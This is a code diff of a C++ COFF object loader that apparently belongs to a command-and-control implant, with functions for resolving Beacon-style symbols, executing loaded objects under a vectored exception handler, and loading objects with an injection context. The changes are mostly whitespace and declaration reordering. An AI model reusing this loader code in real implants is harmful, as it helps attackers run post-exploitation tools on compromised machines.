@@ -1,4 +1,4 @@
-#include <core/include/objects.cpp.hpp>
+#include <core/include/objects.hpp>
 namespace Objects {
 
     __code_seg(".rdata") void *wrapper_return = nullptr;
@@ -48,11 +48,11 @@ namespace Objects {
 
     BOOL ProcessSymbol(char* sym_string, void** pointer) {
 
-        bool success = true;
-        *pointer = nullptr;
-
+        bool success    = true;
         char *library   = { };
         char *function  = { };
+
+        *pointer = nullptr;
 
         if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
@@ -97,12 +97,12 @@ namespace Objects {
 
     BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size) {
 
-        void        *veh_handle = { };
-        void        *entrypoint = { };
-        char        *sym_name   = { };
+        void *veh_handle = { };
+        void *entrypoint = { };
+        char *sym_name   = { };
 
-        uint32_t    protect     = 0;
-        bool        success     = true;
+        bool success     = true;
+        uint32_t protect = 0;
 
         x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));
 
@@ -168,8 +168,8 @@ namespace Objects {
 
     VOID Cleanup(_executable *object) {
 
-        void    *pointer    = { };
-        size_t  size        = 0;
+        void *pointer   = { };
+        size_t size     = 0;
 
         x_assert(object);
         x_assert(object->base);
@@ -280,9 +280,9 @@ namespace Objects {
 
     SIZE_T GetFunctionMapSize(_executable *object) {
 
-        char    sym_name[9] = { };
-        char    *buffer     = { };
-        int     counter     = 0;
+        char sym_name[9]    = { };
+        char *buffer        = { };
+        int counter         = 0;
 
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
 
@@ -341,7 +341,7 @@ namespace Objects {
     VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id, bool cache) {
 
         _executable *object = { };
-        uint8_t     *next   = { };
+        uint8_t *next       = { };
 
         x_assert(data);
 
@@ -417,8 +417,8 @@ namespace Objects {
     VOID LoadObject(_parser parser) {
         // todo: maybe loadable objects in remote processes??
 
-        _injection_ctx  inject  = { };
-        _coff_params    *params = (_coff_params*) x_malloc(sizeof(_coff_params));
+        _injection_ctx inject   = { };
+        _coff_params *params    = (_coff_params*) x_malloc(sizeof(_coff_params));
 
         params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
         params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
